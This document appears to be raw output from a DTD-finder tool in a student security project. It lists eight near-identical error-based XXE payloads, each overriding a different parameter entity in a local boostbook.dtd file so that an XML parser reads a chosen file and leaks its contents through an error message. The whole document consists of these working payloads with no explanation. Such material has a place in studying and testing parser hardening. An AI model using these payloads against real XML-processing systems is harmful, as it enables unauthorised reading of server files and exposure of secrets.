**XXE Payload:**
```
<!DOCTYPE message [
    <!ENTITY % local_dtd SYSTEM "file:////home/sagar/Main/MTech/SDE/Project/xmlvuln/dtd-finder/src/test/resources/boostbook/boostbook.dtd">

    <!ENTITY % boost.namespace.mix 'aaa)>
        <!ENTITY &#x25; file SYSTEM "file:///YOUR_FILE">
        <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///abcxyz/&#x25;file;&#x27;>">
        &#x25;eval;
        &#x25;error;
        <!ELEMENT aa (bb'>

    %local_dtd;
]>
<message></message>
```

 --- 

**DTD File:** `//home/sagar/Main/MTech/SDE/Project/xmlvuln/dtd-finder/src/test/resources/boostbook/boostbook.dtd`

**Injectable entity:** `boost.template.mix`

**XXE Payload:**
```
<!DOCTYPE message [
    <!ENTITY % local_dtd SYSTEM "file:////home/sagar/Main/MTech/SDE/Project/xmlvuln/dtd-finder/src/test/resources/boostbook/boostbook.dtd">

    <!ENTITY % boost.template.mix 'aaa)>
        <!ENTITY &#x25; file SYSTEM "file:///YOUR_FILE">
        <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///abcxyz/&#x25;file;&#x27;>">
        &#x25;eval;
        &#x25;error;
        <!ELEMENT aa (bb'>

    %local_dtd;
]>
<message></message>
```

 --- 

**DTD File:** `//home/sagar/Main/MTech/SDE/Project/xmlvuln/dtd-finder/src/test/resources/boostbook/boostbook.dtd`

**Injectable entity:** `boost.class.content`

**XXE Payload:**
```
<!DOCTYPE message [
    <!ENTITY % local_dtd SYSTEM "file:////home/sagar/Main/MTech/SDE/Project/xmlvuln/dtd-finder/src/test/resources/boostbook/boostbook.dtd">

    <!ENTITY % boost.class.content 'aaa)>
        <!ENTITY &#x25; file SYSTEM "file:///YOUR_FILE">
        <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///abcxyz/&#x25;file;&#x27;>">
        &#x25;eval;
        &#x25;error;
        <!ELEMENT aa (bb'>

    %local_dtd;
]>
<message></message>
```

 --- 

**DTD File:** `//home/sagar/Main/MTech/SDE/Project/xmlvuln/dtd-finder/src/test/resources/boostbook/boostbook.dtd`

**Injectable entity:** `boost.class-specialization.content`

**XXE Payload:**
```
<!DOCTYPE message [
    <!ENTITY % local_dtd SYSTEM "file:////home/sagar/Main/MTech/SDE/Project/xmlvuln/dtd-finder/src/test/resources/boostbook/boostbook.dtd">

    <!ENTITY % boost.class-specialization.content 'aaa)>
        <!ENTITY &#x25; file SYSTEM "file:///YOUR_FILE">
        <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///abcxyz/&#x25;file;&#x27;>">
        &#x25;eval;
        &#x25;error;
        <!ELEMENT aa (bb'>

    %local_dtd;
]>
<message></message>
```

 --- 

**DTD File:** `//home/sagar/Main/MTech/SDE/Project/xmlvuln/dtd-finder/src/test/resources/boostbook/boostbook.dtd`

**Injectable entity:** `boost.function.semantics`

**XXE Payload:**
```
<!DOCTYPE message [
    <!ENTITY % local_dtd SYSTEM "file:////home/sagar/Main/MTech/SDE/Project/xmlvuln/dtd-finder/src/test/resources/boostbook/boostbook.dtd">

    <!ENTITY % boost.function.semantics 'aaa)>
        <!ENTITY &#x25; file SYSTEM "file:///YOUR_FILE">
        <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///abcxyz/&#x25;file;&#x27;>">
        &#x25;eval;
        &#x25;error;
        <!ELEMENT aa (bb'>

    %local_dtd;
]>
<message></message>
```

 --- 

**DTD File:** `//home/sagar/Main/MTech/SDE/Project/xmlvuln/dtd-finder/src/test/resources/boostbook/boostbook.dtd`

**Injectable entity:** `library.content`

**XXE Payload:**
```
<!DOCTYPE message [
    <!ENTITY % local_dtd SYSTEM "file:////home/sagar/Main/MTech/SDE/Project/xmlvuln/dtd-finder/src/test/resources/boostbook/boostbook.dtd">

    <!ENTITY % library.content 'aaa)>
        <!ENTITY &#x25; file SYSTEM "file:///YOUR_FILE">
        <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///abcxyz/&#x25;file;&#x27;>">
        &#x25;eval;
        &#x25;error;
        <!ELEMENT aa (bb'>

    %local_dtd;
]>
<message></message>
```

 --- 

**DTD File:** `//home/sagar/Main/MTech/SDE/Project/xmlvuln/dtd-finder/src/test/resources/boostbook/boostbook.dtd`

**Injectable entity:** `boost.testsuite.test.content`

**XXE Payload:**
```
<!DOCTYPE message [
    <!ENTITY % local_dtd SYSTEM "file:////home/sagar/Main/MTech/SDE/Project/xmlvuln/dtd-finder/src/test/resources/boostbook/boostbook.dtd">

    <!ENTITY % boost.testsuite.test.content 'aaa)>
        <!ENTITY &#x25; file SYSTEM "file:///YOUR_FILE">
        <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///abcxyz/&#x25;file;&#x27;>">
        &#x25;eval;
        &#x25;error;
        <!ELEMENT aa (bb'>

    %local_dtd;
]>
<message></message>
```

 --- 

**DTD File:** `//home/sagar/Main/MTech/SDE/Project/xmlvuln/dtd-finder/src/test/resources/boostbook/boostbook.dtd`

**Injectable entity:** `DocBook`

**XXE Payload:**
```
<!DOCTYPE message [
    <!ENTITY % local_dtd SYSTEM "file:////home/sagar/Main/MTech/SDE/Project/xmlvuln/dtd-finder/src/test/resources/boostbook/boostbook.dtd">

    <!ENTITY % DocBook '
        <!ENTITY &#x25; file SYSTEM "file:///YOUR_FILE">
        <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///abcxyz/&#x25;file;&#x27;>">
        &#x25;eval;
        &#x25;error;
        '>

    %local_dtd;
]>
<message></message>
```

 --- 

